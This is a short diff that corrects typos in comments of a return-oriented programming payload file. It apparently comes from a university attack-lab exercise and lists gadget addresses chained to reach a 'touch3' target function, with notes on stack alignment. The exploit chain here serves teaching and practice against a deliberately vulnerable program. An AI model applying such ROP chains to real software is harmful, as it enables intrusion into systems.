@@ -17,7 +17,7 @@ ab 19 40 00 00 00 00 00  /* addr of gadget3 -> pop rax */
 dd 19 40 00 00 00 00 00  /* addr of gadget4 -> mov %eax,%edx */
 
 69 1a 40 00 00 00 00 00  /* addr of gadget5 -> mov %edx,%ecx
-                            08 db corrsponds to a functional nop */
+                            08 db corresponds to a functional nop */
 
 13 1a 40 00 00 00 00 00  /* addr of gadget6 -> mov %ecx,%esi */
 
@@ -35,4 +35,4 @@ fa 18 40 00 00 00 00 00  /* addr of touch3 */
 
 /* The stack is already aligned before jumping to touch3 
    %rsp ends in '0' just before touch3 is popped so %rsp 
-   ends in '8' after rip enters touch */
+   ends in '8' after rip enters touch3 */
